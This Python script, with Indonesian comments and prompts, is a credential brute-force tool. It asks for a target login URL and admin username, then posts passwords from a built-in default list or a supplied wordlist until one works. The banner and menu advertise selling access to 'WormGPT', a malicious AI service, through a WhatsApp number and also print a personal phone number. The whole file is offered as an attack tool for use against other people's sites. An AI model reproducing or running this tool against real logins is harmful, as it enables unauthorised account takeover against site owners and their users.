import requests
from colorama import Fore
import os
from urllib.parse import urlparse
from playsound import playsound

os.system('clear')
playsound('https://a.top4top.io/m_3012iesja1.mp3')
print(f'''{Fore.RED}
  ____  _____  _    _ _______ ______   ______ ____  _____   _____ ______  _           _ ____  _____  __  __
 |  _ \|  __ \| |  | |__   __|  ____| |  ____/ __ \|  __ \ / ____|  ____| \ \        / / __ \|  __ \|  \/  |
 | |_) | |__) | |  | |  | |  | |__    | |__ | |  | | |__) | |    | |__     \ \  /\  / / |  | | |__) | \  / |
 |  _ <|  _  /| |  | |  | |  |  __|   |  __|| |  | |  _  /| |    |  __|     \ \/  \/ /| |  | |  _  /| |\/| |{Fore.WHITE}
 | |_) | | \ \| |__| |  | |  | |____  | |   | |__| | | \ \| |____| |____     \  /\  / | |__| | | \ \| |  | |
 |____/|_|  \_\\____/   |_|  |______| |_|    \____/|_|  \_\\_____|______|     \/  \/   \____/|_|  \_\_|  |_|
''')

print(f'''{Fore.LIGHTBLUE_EX}
|------------------------------------------------------------|
|                CEYSI LOVE ALEX PRIVATE TOOLS               |
|                      STATUS : {Fore.GREEN}PRIVATE                      |
|  AUTHOR                : {Fore.GREEN}ALEX                              |
|  GIRLFRIEND            : {Fore.GREEN}CEYSI                             |
|  {Fore.RED}YOUTUBE               : {Fore.RED}NONE                              |
|  {Fore.CYAN}TELEGAM               : {Fore.CYAN}t.me/CeysiTan                     | 
|  {Fore.GREEN}WHATSAPP NUMBER       : {Fore.GREEN}PRIVATE                           |
|  WHATSAPP NUMBER CEYSI : {Fore.LIGHTGREEN_EX}085223500085/ +6285223500085      |
|  {Fore.LIGHTBLUE_EX}TOOLS                 : {Fore.LIGHTGREEN_EX}PREMIUM                           |
|------------------------------------------------------------|

''')
def brute_force_login(url, username, password_list):
    for password in password_list:
        try:
            # Kirim permintaan login dengan kombinasi username dan password saat ini
            response = requests.post(url, data={'username': username, 'password': password})

            # Periksa jika respons memiliki kode status 200 (OK)
            if response.status_code == 200:
                print(f"{Fore.CYAN}Login berhasil! Username: {username}, Password: {password}")
                return True

            # Jika tidak, lanjutkan ke password berikutnya
            else:
                print(f"{Fore.MAGENTA}Login gagal dengan password:{Fore.YELLOW} {password}")
                
                
               
                
           
                

           

        # Tangani kesalahan koneksi atau permintaan
        except Exception as e:
            print(f"Terjadi kesalahan Koneksi/Permintaan,Periksa Koneksi Mu Ya OM:) : {e}")
            
            print('program selesai')
            playsound('https://a.top4top.io/m_3012nrkzo1.mp3')
            return False
    # Jika tidak ada password yang berhasil, kembalikan False
           

playsound('https://f.top4top.io/m_30121gsv71.mp3')
# URL target dan informasi login

target_url = input(f'{Fore.MAGENTA}Masukan Url Target Untuk Brute Force 💀 : {Fore.LIGHTGREEN_EX}')
target_username = input('Masukan Username Admin (ex:admin) : ')


# Daftar kata sandi default
default_passwords_to_try = ['admin1234','admin','admin1234','admin123456','admin12345','anjaysksk1234','superamdin','ssdd9','anjsuss299292','hackedd22','Gunakan Wordlist Aja Lebih Bagus..']


while True:
    # Meminta pilihan dari pengguna
    option = input(f"{Fore.LIGHTGREEN_EX}Pilih opsi:\n{Fore.CYAN}1. {Fore.GREEN}Gunakan daftar kata sandi dari tools\n{Fore.CYAN}2. {Fore.LIGHTMAGENTA_EX}Gunakan wordlist {Fore.LIGHTYELLOW_EX}(rekomendasi)\n{Fore.CYAN}3. {Fore.RED}Beli Akses WormGPT PM Whatsapp : 085223500085\nPilihan Anda: ")

    # Jika pengguna memilih opsi 1
    if option == '1':
        passwords_to_try = default_passwords_to_try
       
        break
    # Jika pengguna memilih opsi 2
    elif option == '2':
        # Masukkan nama file teks yang berisi daftar kata sandi
        wordlist_file = input(f"{Fore.CYAN}Masukkan nama file teks {Fore.LIGHTRED_EX}(contoh: wordlist.txt): ")

        try:
            # Buka file dan baca setiap baris sebagai daftar kata sandi
            with open(wordlist_file, 'r') as f:
                passwords_to_try = f.read().splitlines()
                
                
                break
        except FileNotFoundError:
            print("File tidak ditemukan. Pastikan nama file dan path yang Anda masukkan benar.")
    elif option == '3':
        os.system('clear')
        print(Fore.LIGHTRED_EX,'''
                                                                           __        __                      ____ ____ _____ 
                                                                           \ \      / /__  _ __ _ __ ___    / ___|  _ \_   _|
                                                                            \ \ /\ / / _ \| '__| '_ ` _ \  | |  _| |_) || |  
                                                                             \ V  V / (_) | |  | | | | | | | |_| |  __/ | |  
                                                                              \_/\_/ \___/|_|  |_| |_| |_|  \____|_|    |_|  
        ''')
        print(f'{Fore.MAGENTA}                                                             WhatsApp Nomor Admin Untuk Membeli Akses WormGPT : {Fore.GREEN}085223500085 / +6285223500085')
        playsound('https://d.top4top.io/m_3012f8jji1.mpeg')
        exit()

    else:
        os.system('clear')
        print("Pilihan tidak valid mohon input yang benar dong ommm!!.")
        exit()

# Panggil fungsi brute force
brute_force_login(target_url, target_username, passwords_to_try)


